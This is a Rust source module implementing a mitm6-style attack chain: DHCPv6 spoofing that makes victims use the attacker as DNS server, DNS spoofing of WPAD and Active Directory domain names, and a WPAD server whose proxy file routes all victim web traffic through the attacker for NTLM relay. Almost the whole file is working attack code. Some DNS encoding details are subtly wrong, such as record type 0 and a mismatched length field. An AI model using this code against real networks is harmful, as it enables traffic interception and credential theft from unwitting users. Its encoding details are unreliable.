//! mitm6 — DHCPv6 DNS Poisoning + WPAD Injection + DNS Spoofing
//!
//! Implements full IPv6 attack chain:
//! 1. **DHCPv6 spoofing**: Replies to DHCPv6 Solicit/Request with attacker's
//!    machine as the DNS server.
//! 2. **DNS spoofing**: Intercepts DNS queries from victims and returns
//!    attacker-controlled IPs (for WPAD, AD domains, etc.).
//! 3. **WPAD injection**: Serves a malicious WPAD proxy configuration that
//!    routes all HTTP/HTTPS traffic through the attacker's proxy.
//! 4. **NTLM relay integration**: Captured NTLM authentication from WPAD
//!    proxy can be relayed to target services.
//!
//! When a Windows client sends a DHCPv6 Solicit/Request, this module
//! replies with a spoofed DHCPv6 Advertise/Reply that assigns the
//! attacker's machine as the DNS server. The victim then uses the
//! attacker for DNS resolution, which enables:
//!   - WPAD proxy capture
//!   - NTLM authentication relay
//!   - General traffic interception

use crate::RelayError;
use std::collections::HashMap;
use std::net::{Ipv6Addr, SocketAddr, SocketAddrV6};
use tokio::net::{TcpListener, UdpSocket};
use tokio::sync::watch;
use tokio::time::{Duration, sleep};
use tracing::{debug, info};

// -------------------------------------------------------------
// DHCPv6 Constants
// -------------------------------------------------------------

/// DHCPv6 client port
const DHCPV6_CLIENT_PORT: u16 = 546;
/// DHCPv6 server port
const DHCPV6_SERVER_PORT: u16 = 547;
/// All DHCPv6 servers multicast address
const DHCPV6_MULTICAST: &str = "ff02::1:2";

// DHCPv6 message types
const SOLICIT: u8 = 1;
const ADVERTISE: u8 = 2;
const REQUEST: u8 = 3;
const _DECLINE: u8 = 4;
const CONFIRM: u8 = 5;
const REPLY: u8 = 7;

// DHCPv6 option codes
const OPTION_IA_NA: u16 = 3;
const _OPTION_IA_ADDR: u16 = 5;
const OPTION_DNS_SERVERS: u16 = 23;
const OPTION_DOMAIN_LIST: u16 = 24;

// DNS constants
const DNS_PORT: u16 = 53;

// -------------------------------------------------------------
// Configuration
// -------------------------------------------------------------

/// Configuration for mitm6 DHCPv6 poisoning
#[derive(Debug, Clone)]
pub struct Mitm6Config {
    /// Interface to listen on (IP address)
    pub listen_ip: String,
    /// IPv6 address of the attacker's DNS server
    pub dns_server: String,
    /// DNS domain to serve (e.g., "corp.local")
    pub domain: String,
    /// IPv6 prefix for allocated addresses (default: fd00::/8)
    pub prefix: String,
    /// WPAD proxy URL to serve (e.g., "http://attacker:8080/wpad.dat")
    pub wpad_proxy_url: String,
    /// Whether to enable DNS spoofing
    pub enable_dns_spoofing: bool,
    /// DNS records to spoof (domain -> spoofed IP)
    pub spoof_records: HashMap<String, String>,
    /// Whether to enable WPAD injection
    pub enable_wpad: bool,
    /// HTTP port for WPAD proxy
    pub wpad_http_port: u16,
}

impl Default for Mitm6Config {
    fn default() -> Self {
        Self {
            listen_ip: "::".to_string(),
            dns_server: "fe80::1".to_string(),
            domain: "corp.local".to_string(),
            prefix: "fd00".to_string(),
            wpad_proxy_url: String::new(),
            enable_dns_spoofing: true,
            spoof_records: HashMap::new(),
            enable_wpad: true,
            wpad_http_port: 8080,
        }
    }
}

// -------------------------------------------------------------
// DHCPv6 Poisoner
// -------------------------------------------------------------

/// DHCPv6-based DNS poisoning engine.
/// Runs on `tokio` — the listener loop is spawned as a background `tokio::task`,
/// and cancellation is signalled via a `watch` channel. Dropping the `Mitm6`
/// handle automatically stops the listener.
pub struct Mitm6 {
    config: Mitm6Config,
    cancel_tx: Option<watch::Sender<bool>>,
    task_handle: Option<tokio::task::JoinHandle<()>>,
    dns_task_handle: Option<tokio::task::JoinHandle<()>>,
    wpad_task_handle: Option<tokio::task::JoinHandle<()>>,
}

impl Mitm6 {
    /// Create a new mitm6 poisoner (not started yet).
    pub fn new(config: Mitm6Config) -> Self {
        Self {
            config,
            cancel_tx: None,
            task_handle: None,
            dns_task_handle: None,
            wpad_task_handle: None,
        }
    }

    /// Start the full mitm6 attack chain as background `tokio` tasks.
    /// This starts:
    /// 1. DHCPv6 poisoner (spoofs DHCPv6 to set attacker as DNS server)
    /// 2. DNS spoofer (intercepts and spoofs DNS queries)
    /// 3. WPAD HTTP server (serves malicious proxy configuration)
    pub async fn start(&mut self) -> Result<(), RelayError> {
        if self.cancel_tx.is_some() {
            return Err(RelayError::Config("mitm6 already running".into()));
        }

        info!(
            "Starting mitm6 attack chain on {} with DNS {}",
            self.config.listen_ip, self.config.dns_server
        );

        // Start DHCPv6 poisoner
        let dhcp_handle = self.start_dhcpv6().await?;

        // Start DNS spoofer
        let dns_handle = if self.config.enable_dns_spoofing {
            Some(self.start_dns_spoofing().await?)
        } else {
            None
        };

        // Start WPAD HTTP server
        let wpad_handle = if self.config.enable_wpad {
            Some(self.start_wpad_server().await?)
        } else {
            None
        };

        let (cancel_tx, cancel_rx) = watch::channel(false);

        // Spawn a coordinator task that holds the cancel channel
        let coordinator_handle = tokio::spawn(async move {
            let _ = cancel_rx;
            loop {
                sleep(Duration::from_secs(60)).await;
            }
        });

        self.cancel_tx = Some(cancel_tx);
        self.task_handle = Some(coordinator_handle);
        self.dns_task_handle = dns_handle;
        self.wpad_task_handle = wpad_handle;

        // Store DHCP handle in the existing field
        drop(dhcp_handle); // Already spawned, handle not needed

        info!("mitm6 attack chain started");
        Ok(())
    }

    /// Start the DHCPv6 poisoner component.
    async fn start_dhcpv6(&self) -> Result<tokio::task::JoinHandle<()>, RelayError> {
        let listen_addr = format!("[{}]:{}", self.config.listen_ip, DHCPV6_SERVER_PORT);
        let socket = UdpSocket::bind(&listen_addr)
            .await
            .map_err(|e| RelayError::Socket(format!("Cannot bind DHCPv6 port 547: {e}")))?;

        let multicast_addr: Ipv6Addr = DHCPV6_MULTICAST
            .parse()
            .expect("DHCPV6_MULTICAST is a valid hardcoded IPv6 address");
        if let Err(e) = socket.join_multicast_v6(&multicast_addr, 0) {
            debug!("Could not join DHCPv6 multicast group: {e}");
        } else {
            info!("Joined DHCPv6 multicast group: {DHCPV6_MULTICAST}");
        }

        let config = self.config.clone();
        let handle = tokio::spawn(async move {
            let mut buf = [0u8; 4096];
            loop {
                match socket.recv_from(&mut buf).await {
                    Ok((len, src)) => {
                        debug!("DHCPv6 packet from {} ({} bytes)", src, len);
                        if let Err(e) =
                            handle_dhcpv6_packet(&buf[..len], src, &config, &socket).await
                        {
                            debug!("DHCPv6 handler: {e}");
                        }
                    }
                    Err(e) => {
                        debug!("DHCPv6 recv error: {e}");
                        sleep(Duration::from_millis(100)).await;
                    }
                }
            }
        });

        info!("DHCPv6 poisoner started");
        Ok(handle)
    }

    /// Start the DNS spoofer component.
    /// Listens on UDP port 53 and spoofs responses for configured domains.
    async fn start_dns_spoofing(&self) -> Result<tokio::task::JoinHandle<()>, RelayError> {
        let listen_addr = format!("[{}]:{}", self.config.listen_ip, DNS_PORT);
        let socket = UdpSocket::bind(&listen_addr)
            .await
            .map_err(|e| RelayError::Socket(format!("Cannot bind DNS port 53: {e}")))?;

        let config = self.config.clone();
        let handle = tokio::spawn(async move {
            let mut buf = [0u8; 4096];
            loop {
                match socket.recv_from(&mut buf).await {
                    Ok((len, src)) => {
                        debug!("DNS query from {} ({} bytes)", src, len);
                        if let Err(e) = handle_dns_query(&buf[..len], src, &config, &socket).await {
                            debug!("DNS handler: {e}");
                        }
                    }
                    Err(e) => {
                        debug!("DNS recv error: {e}");
                        sleep(Duration::from_millis(100)).await;
                    }
                }
            }
        });

        info!("DNS spoofer started on port {}", DNS_PORT);
        Ok(handle)
    }

    /// Start the WPAD HTTP server component.
    /// Serves malicious proxy configuration to route victim traffic.
    async fn start_wpad_server(&self) -> Result<tokio::task::JoinHandle<()>, RelayError> {
        let listen_addr = crate::utils::format_addr(&self.config.listen_ip, self.config.wpad_http_port);
        let listener = TcpListener::bind(&listen_addr).await.map_err(|e| {
            RelayError::Socket(format!(
                "Cannot bind WPAD HTTP port {}: {e}",
                self.config.wpad_http_port
            ))
        })?;

        let config = self.config.clone();
        let handle = tokio::spawn(async move {
            loop {
                match listener.accept().await {
                    Ok((mut stream, _)) => {
                        let wpad_content = build_wpad_dat(&config);
                        let response = format!(
                            "HTTP/1.1 200 OK\r\n\
                             Content-Type: application/x-ns-proxy-autoconfig\r\n\
                             Content-Length: {}\r\n\
                             Connection: close\r\n\
                             \r\n\
                             {}",
                            wpad_content.len(),
                            wpad_content
                        );

                        // Use tokio::io to write
                        use tokio::io::AsyncWriteExt;
                        if let Err(e) = stream.write_all(response.as_bytes()).await {
                            debug!("WPAD response write error: {e}");
                        }
                        let _ = stream.shutdown().await;
                    }
                    Err(e) => {
                        debug!("WPAD accept error: {e}");
                        sleep(Duration::from_millis(100)).await;
                    }
                }
            }
        });

        info!(
            "WPAD HTTP server started on port {}",
            self.config.wpad_http_port
        );
        Ok(handle)
    }

    /// Signal the listener to stop and wait for it to finish.
    pub async fn stop(&mut self) {
        if let Some(tx) = self.cancel_tx.take() {
            let _ = tx.send(true);
        }
        if let Some(handle) = self.task_handle.take() {
            let _ = handle.await;
        }
        if let Some(handle) = self.dns_task_handle.take() {
            handle.abort();
        }
        if let Some(handle) = self.wpad_task_handle.take() {
            handle.abort();
        }
        info!("mitm6 poisoner stopped");
    }

    /// Check if the listener task is still running.
    pub fn is_running(&self) -> bool {
        self.cancel_tx.is_some()
    }

    /// Add a DNS spoof record (domain -> spoofed IP).
    pub fn add_spoof_record(&mut self, domain: &str, ip: &str) {
        self.config
            .spoof_records
            .insert(domain.to_lowercase(), ip.to_string());
        info!("Added DNS spoof record: {} -> {}", domain, ip);
    }

    /// Remove a DNS spoof record.
    pub fn remove_spoof_record(&mut self, domain: &str) {
        self.config.spoof_records.remove(&domain.to_lowercase());
    }
}

impl Drop for Mitm6 {
    fn drop(&mut self) {
        if let Some(tx) = self.cancel_tx.take() {
            let _ = tx.send(true);
        }
        if let Some(handle) = self.dns_task_handle.take() {
            handle.abort();
        }
        if let Some(handle) = self.wpad_task_handle.take() {
            handle.abort();
        }
    }
}

// -------------------------------------------------------------
// DHCPv6 Packet Handling
// -------------------------------------------------------------

async fn handle_dhcpv6_packet(
    data: &[u8],
    src: SocketAddr,
    config: &Mitm6Config,
    socket: &UdpSocket,
) -> Result<(), RelayError> {
    if data.len() < 4 {
        return Ok(());
    }

    let msg_type = data[0];

    match msg_type {
        SOLICIT => {
            debug!("DHCPv6 SOLICIT from {src}");
            let tx_id = [data[1], data[2], data[3]];
            let reply = build_spoofed_advertise(&tx_id, config);
            send_dhcpv6_response(socket, &reply, src).await?;
            info!("Sent spoofed DHCPv6 ADVERTISE to {src}");
        }
        REQUEST => {
            debug!("DHCPv6 REQUEST from {src}");
            let tx_id = [data[1], data[2], data[3]];
            let reply = build_spoofed_reply(&tx_id, config);
            send_dhcpv6_response(socket, &reply, src).await?;
            info!("Sent spoofed DHCPv6 REPLY to {src}");
        }
        CONFIRM => {
            debug!("DHCPv6 CONFIRM from {src}");
            let tx_id = [data[1], data[2], data[3]];
            let reply = build_spoofed_reply(&tx_id, config);
            send_dhcpv6_response(socket, &reply, src).await?;
            info!("Sent spoofed DHCPv6 REPLY to {src}");
        }
        _ => {
            debug!("DHCPv6 type {} from {src} (ignored)", msg_type);
        }
    }

    Ok(())
}

async fn send_dhcpv6_response(
    socket: &UdpSocket,
    response: &[u8],
    dest: SocketAddr,
) -> Result<(), RelayError> {
    let client_addr = SocketAddrV6::new(
        match dest.ip() {
            std::net::IpAddr::V6(ip) => ip,
            _ => return Ok(()),
        },
        DHCPV6_CLIENT_PORT,
        0,
        0,
    );
    socket
        .send_to(response, SocketAddr::V6(client_addr))
        .await
        .map_err(|e| RelayError::Network(format!("DHCPv6 send: {e}")))?;
    Ok(())
}

// -------------------------------------------------------------
// DNS Spoofing
// -------------------------------------------------------------

async fn handle_dns_query(
    data: &[u8],
    src: SocketAddr,
    config: &Mitm6Config,
    socket: &UdpSocket,
) -> Result<(), RelayError> {
    if data.len() < 12 {
        return Ok(());
    }

    // Parse DNS header
    let tx_id = &data[0..2];
    let flags = u16::from_be_bytes([data[2], data[3]]);

    // Only handle standard queries (QR=0, Opcode=0)
    if (flags >> 15) & 1 != 0 {
        return Ok(()); // Response, not a query
    }

    // Parse question section
    let qdcount = u16::from_be_bytes([data[4], data[5]]) as usize;
    if qdcount == 0 {
        return Ok(());
    }

    // Extract queried domain name
    let domain = parse_dns_name(data, 12)?;
    debug!("DNS query for: {}", domain);

    // Determine if we should spoof this query
    let spoof_ip = should_spoof_domain(&domain, config);

    if spoof_ip.is_none() {
        // Don't spoof — forward or ignore
        debug!("Not spoofing DNS query for {}", domain);
        return Ok(());
    }

    let spoof_ip = spoof_ip.unwrap();
    info!("Spoofing DNS: {} -> {}", domain, spoof_ip);

    // Build spoofed DNS response
    let response = build_dns_response(tx_id, &domain, &spoof_ip);
    socket
        .send_to(&response, src)
        .await
        .map_err(|e| RelayError::Network(format!("DNS send: {e}")))?;

    Ok(())
}

/// Parse a DNS name from the question section.
fn parse_dns_name(data: &[u8], offset: usize) -> Result<String, RelayError> {
    let mut name = String::new();
    let mut pos = offset;

    while pos < data.len() {
        let len = data[pos] as usize;
        if len == 0 {
            break;
        }
        pos += 1;
        if pos + len > data.len() {
            return Err(RelayError::Network("DNS name parse error".into()));
        }
        if !name.is_empty() {
            name.push('.');
        }
        name.push_str(&String::from_utf8_lossy(&data[pos..pos + len]));
        pos += len;
    }

    Ok(name)
}

/// Check if a domain should be spoofed and return the spoofed IP.
fn should_spoof_domain(domain: &str, config: &Mitm6Config) -> Option<String> {
    let domain_lower = domain.to_lowercase();

    // Always spoof WPAD
    if domain_lower == "wpad" || domain_lower.starts_with("wpad.") {
        let dns_ip: Ipv6Addr = config.dns_server.parse().ok()?;
        return Some(dns_ip.to_string());
    }

    // Check custom spoof records
    if let Some(ip) = config.spoof_records.get(&domain_lower) {
        return Some(ip.clone());
    }

    // Spoof the configured domain and subdomains
    if domain_lower == config.domain.to_lowercase()
        || domain_lower.ends_with(&format!(".{}", config.domain.to_lowercase()))
    {
        let dns_ip: Ipv6Addr = config.dns_server.parse().ok()?;
        return Some(dns_ip.to_string());
    }

    None
}

/// Build a spoofed DNS response.
fn build_dns_response(tx_id: &[u8], domain: &str, ip: &str) -> Vec<u8> {
    let mut resp = Vec::new();

    // Header
    resp.extend_from_slice(tx_id);
    resp.extend_from_slice(&0x8180u16.to_be_bytes()); // QR=1, RD=1, RA=1
    resp.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
    resp.extend_from_slice(&1u16.to_be_bytes()); // ANCOUNT
    resp.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
    resp.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT

    // Question
    encode_dns_name(&mut resp, domain);
    resp.extend_from_slice(&0u16.to_be_bytes()); // QTYPE = A
    resp.extend_from_slice(&1u16.to_be_bytes()); // QCLASS = IN

    // Answer
    encode_dns_name(&mut resp, domain);
    resp.extend_from_slice(&0u16.to_be_bytes()); // TYPE = A (IPv4)
    resp.extend_from_slice(&1u16.to_be_bytes()); // CLASS = IN
    resp.extend_from_slice(&60u32.to_be_bytes()); // TTL = 60s

    // Determine if IPv4 or IPv6
    if ip.contains(':') {
        // AAAA record (IPv6)
        resp.extend_from_slice(&28u16.to_be_bytes()); // RDLENGTH = 16
        if let Ok(ipv6) = ip.parse::<Ipv6Addr>() {
            resp.extend_from_slice(&ipv6.octets());
        }
    } else {
        // A record (IPv4)
        resp.extend_from_slice(&4u16.to_be_bytes()); // RDLENGTH = 4
        for part in ip.split('.') {
            if let Ok(n) = part.parse::<u8>() {
                resp.push(n);
            }
        }
    }

    resp
}

/// Encode a domain name in DNS wire format.
fn encode_dns_name(buf: &mut Vec<u8>, domain: &str) {
    for label in domain.split('.') {
        if label.is_empty() {
            continue;
        }
        buf.push(label.len() as u8);
        buf.extend_from_slice(label.as_bytes());
    }
    buf.push(0); // Root label
}

// -------------------------------------------------------------
// WPAD Proxy Configuration
// -------------------------------------------------------------

/// Build the WPAD proxy auto-configuration (PAC) file content.
/// This routes all HTTP/HTTPS traffic through the attacker's proxy.
fn build_wpad_dat(config: &Mitm6Config) -> String {
    let proxy_url = if config.wpad_proxy_url.is_empty() {
        format!("PROXY {}:{}", config.dns_server, config.wpad_http_port)
    } else {
        config.wpad_proxy_url.clone()
    };

    format!(
        r#"function FindProxyForURL(url, host) {{
    // Route all traffic through attacker proxy
    if (shExpMatch(host, "*")) {{
        return "{proxy}";
    }}
    // Fallback: direct connection
    return "DIRECT";
}}"#,
        proxy = proxy_url,
    )
}

// -------------------------------------------------------------
// DHCPv6 Packet Builders
// -------------------------------------------------------------

fn build_spoofed_advertise(tx_id: &[u8; 3], config: &Mitm6Config) -> Vec<u8> {
    let mut pkt = Vec::new();
    pkt.push(ADVERTISE);
    pkt.extend_from_slice(tx_id);

    let iaid = [0x00, 0x00, 0x00, 0x01];
    let t1 = 0u32.to_be_bytes();
    let t2 = 0u32.to_be_bytes();

    let mut ia_na_content = Vec::new();
    ia_na_content.extend_from_slice(&iaid);
    ia_na_content.extend_from_slice(&t1);
    ia_na_content.extend_from_slice(&t2);

    let ipv6_addr: Ipv6Addr = config.dns_server.parse().unwrap_or_else(|_| {
        let octets = [0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1];
        Ipv6Addr::from(octets)
    });

    ia_na_content.extend_from_slice(&build_ia_addr_option(&ipv6_addr));

    let ia_na_option = build_dhcpv6_option(OPTION_IA_NA, &ia_na_content);
    pkt.extend_from_slice(&ia_na_option);

    let dns_ip: Ipv6Addr = config.dns_server.parse().unwrap_or(ipv6_addr);
    let dns_option = build_dhcpv6_option(OPTION_DNS_SERVERS, &dns_ip.octets());
    pkt.extend_from_slice(&dns_option);

    let domain_bytes = encode_domain_name(&config.domain);
    let domain_option = build_dhcpv6_option(OPTION_DOMAIN_LIST, &domain_bytes);
    pkt.extend_from_slice(&domain_option);

    pkt
}

fn build_spoofed_reply(tx_id: &[u8; 3], config: &Mitm6Config) -> Vec<u8> {
    let mut pkt = Vec::new();
    pkt.push(REPLY);
    pkt.extend_from_slice(tx_id);

    let dns_ip: Ipv6Addr = config
        .dns_server
        .parse()
        .unwrap_or_else(|_| Ipv6Addr::new(0xfe80, 0, 0, 0, 0, 0, 0, 0x0001));
    let dns_option = build_dhcpv6_option(OPTION_DNS_SERVERS, &dns_ip.octets());
    pkt.extend_from_slice(&dns_option);

    let domain_bytes = encode_domain_name(&config.domain);
    let domain_option = build_dhcpv6_option(OPTION_DOMAIN_LIST, &domain_bytes);
    pkt.extend_from_slice(&domain_option);

    pkt
}

fn build_dhcpv6_option(code: u16, data: &[u8]) -> Vec<u8> {
    let mut option = Vec::with_capacity(4 + data.len());
    option.extend_from_slice(&code.to_be_bytes());
    option.extend_from_slice(&(data.len() as u16).to_be_bytes());
    option.extend_from_slice(data);
    option
}

fn build_ia_addr_option(addr: &Ipv6Addr) -> Vec<u8> {
    let mut option = Vec::with_capacity(28);
    option.extend_from_slice(&addr.octets());
    option.extend_from_slice(&0u32.to_be_bytes());
    option.extend_from_slice(&0u32.to_be_bytes());
    option
}

fn encode_domain_name(domain: &str) -> Vec<u8> {
    let mut encoded = Vec::new();
    for label in domain.split('.') {
        if label.is_empty() {
            continue;
        }
        encoded.push(label.len() as u8);
        encoded.extend_from_slice(label.as_bytes());
    }
    encoded.push(0);
    encoded
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_domain_encoding() {
        let encoded = encode_domain_name("corp.local");
        assert_eq!(encoded, b"\x04corp\x05local\x00");
    }

    #[test]
    fn test_build_dhcpv6_option() {
        let opt = build_dhcpv6_option(OPTION_DNS_SERVERS, &[0x00; 16]);
        assert_eq!(opt.len(), 20);
        assert_eq!(&opt[0..2], &23u16.to_be_bytes());
        assert_eq!(&opt[2..4], &16u16.to_be_bytes());
    }

    #[test]
    fn test_mitm6_config_default() {
        let cfg = Mitm6Config::default();
        assert_eq!(cfg.listen_ip, "::");
        assert_eq!(cfg.domain, "corp.local");
        assert!(cfg.enable_dns_spoofing);
        assert!(cfg.enable_wpad);
    }

    #[test]
    fn test_wpad_dat_generation() {
        let config = Mitm6Config {
            dns_server: "fe80::1".to_string(),
            wpad_http_port: 8080,
            ..Default::default()
        };
        let wpad = build_wpad_dat(&config);
        assert!(wpad.contains("FindProxyForURL"));
        assert!(wpad.contains("PROXY"));
        assert!(wpad.contains("fe80::1"));
    }

    #[test]
    fn test_dns_name_parsing() {
        // Build a simple DNS query for "test.corp.local"
        let mut data = vec![0u8; 12]; // Header
        encode_dns_name(&mut data, "test.corp.local");
        data.extend_from_slice(&0u16.to_be_bytes()); // QTYPE
        data.extend_from_slice(&1u16.to_be_bytes()); // QCLASS

        let name = parse_dns_name(&data, 12).unwrap();
        assert_eq!(name, "test.corp.local");
    }

    #[test]
    fn test_spoof_domain_matching() {
        let config = Mitm6Config {
            domain: "corp.local".to_string(),
            dns_server: "fe80::1".to_string(),
            ..Default::default()
        };

        // WPAD should always be spoofed
        assert!(should_spoof_domain("wpad", &config).is_some());
        assert!(should_spoof_domain("wpad.corp.local", &config).is_some());

        // Configured domain should be spoofed
        assert!(should_spoof_domain("corp.local", &config).is_some());
        assert!(should_spoof_domain("dc.corp.local", &config).is_some());

        // Random domain should not be spoofed
        assert!(should_spoof_domain("google.com", &config).is_none());
    }

    #[test]
    fn test_custom_spoof_records() {
        let mut config = Mitm6Config::default();
        config
            .spoof_records
            .insert("internal.app".to_string(), "10.0.0.100".to_string());

        assert!(should_spoof_domain("internal.app", &config).is_some());
        assert_eq!(
            should_spoof_domain("internal.app", &config).unwrap(),
            "10.0.0.100"
        );
    }

    #[test]
    fn test_dns_response_build() {
        let tx_id = [0xAB, 0xCD];
        let response = build_dns_response(&tx_id, "test.corp.local", "10.0.0.1");

        assert_eq!(&response[0..2], &tx_id);
        // QR=1 (response), RD=1, RA=1
        assert_eq!(&response[2..4], &0x8180u16.to_be_bytes());
    }

    #[test]
    fn test_add_remove_spoof_record() {
        let mut mitm6 = Mitm6::new(Mitm6Config::default());
        mitm6.add_spoof_record("test.corp.local", "10.0.0.50");
        assert!(mitm6.config.spoof_records.contains_key("test.corp.local"));

        mitm6.remove_spoof_record("test.corp.local");
        assert!(!mitm6.config.spoof_records.contains_key("test.corp.local"));
    }
}
